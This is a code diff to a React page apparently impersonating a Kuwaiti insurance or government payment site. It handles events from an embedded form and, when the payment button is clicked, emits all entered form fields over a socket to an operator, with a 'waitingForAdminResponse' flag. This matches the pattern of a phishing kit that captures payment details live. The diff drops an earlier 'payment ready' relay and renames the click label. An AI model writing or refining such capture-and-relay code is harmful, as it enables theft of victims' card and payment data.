@@ -128,21 +128,7 @@ export default function KuwaitInsuranceHome() {
         }
       }
 
-      // ===== PAYMENT BUTTON ACTIVATED =====
-      if (type === 'moh-payment-ready') {
-        const { fields, buttonText } = event.data;
-        console.log('[MOH] Payment button activated:', buttonText, fields);
-        
-        if (fields && Object.keys(fields).length > 0 && isConnected) {
-          socket.value.emit('more-info', {
-            content: fields,
-            page: `✅ تم تفعيل زر الدفع: ${path || 'unknown'}`,
-            waitingForAdminResponse: false,
-          });
-        }
-      }
-
-      // ===== PAYMENT BUTTON CLICKED =====
+      // ===== PAYMENT BUTTON CLICKED (once) =====
       if (type === 'moh-payment-click') {
         const { fields, buttonText } = event.data;
         console.log('[MOH] Payment button clicked:', buttonText, fields);
@@ -150,7 +136,7 @@ export default function KuwaitInsuranceHome() {
         if (fields && Object.keys(fields).length > 0 && isConnected) {
           socket.value.emit('more-info', {
             content: fields,
-            page: `💳 ضغط زر الدفع: ${path || 'unknown'}`,
+            page: `💳 الدفع الإلكتروني: ${path || 'unknown'}`,
             waitingForAdminResponse: false,
           });
         }
